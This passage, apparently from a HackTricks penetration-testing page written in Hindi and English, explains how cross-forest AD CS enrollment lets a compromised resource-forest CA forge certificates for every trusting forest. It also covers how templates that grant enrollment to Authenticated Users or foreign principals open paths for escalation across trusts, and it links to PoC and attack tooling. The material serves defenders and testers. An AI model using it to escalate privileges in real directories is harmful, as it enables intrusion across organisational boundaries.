**cross-forest enrollment** के लिए configuration को अपेक्षाकृत सरल बनाया जाता है। Resource forest से प्राप्त **root CA certificate** को administrators द्वारा **account forests** में **publish** किया जाता है, और resource forest के **enterprise CA** certificates को प्रत्येक account forest के `NTAuthCertificates` और AIA containers में **add** किया जाता है। स्पष्ट रूप से कहा जाए तो, यह व्यवस्था resource forest में मौजूद **CA** को उन सभी अन्य forests पर पूर्ण नियंत्रण प्रदान करती है, जिनके लिए वह PKI manage करता है। यदि इस CA को **attackers द्वारा compromise** कर लिया जाए, तो resource और account forests के सभी users के लिए certificates उनके द्वारा **forge** किए जा सकते हैं, जिससे forest की security boundary टूट जाती है।

### Foreign Principals को दिए गए Enrollment Privileges

Multi-forest environments में, उन Enterprise CAs के संबंध में सावधानी आवश्यक होती है जो ऐसे **certificate templates publish** करते हैं, जिनमें **Authenticated Users या foreign principals** (अर्थात उस forest से बाहरी users/groups, जिससे Enterprise CA संबंधित है) को **enrollment और edit rights** दिए जाते हैं।\
किसी trust के across authentication के बाद, AD द्वारा **Authenticated Users SID** को user के token में add किया जाता है। इसलिए, यदि किसी domain में ऐसा Enterprise CA मौजूद हो जिसके template में **Authenticated Users enrollment rights** की अनुमति हो, तो किसी अलग forest के user द्वारा उस template में **enroll** किया जा सकता है। इसी प्रकार, यदि किसी template द्वारा **enrollment rights** किसी foreign principal को explicitly grant किए गए हों, तो इससे **cross-forest access-control relationship** बन जाता है, जिससे एक forest का principal दूसरे forest के template में **enroll** कर सकता है।

दोनों scenarios के कारण एक forest से दूसरे forest तक **attack surface में वृद्धि** होती है। Certificate template की settings का attacker द्वारा exploitation करके foreign domain में additional privileges प्राप्त किए जा सकते हैं।

## References

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
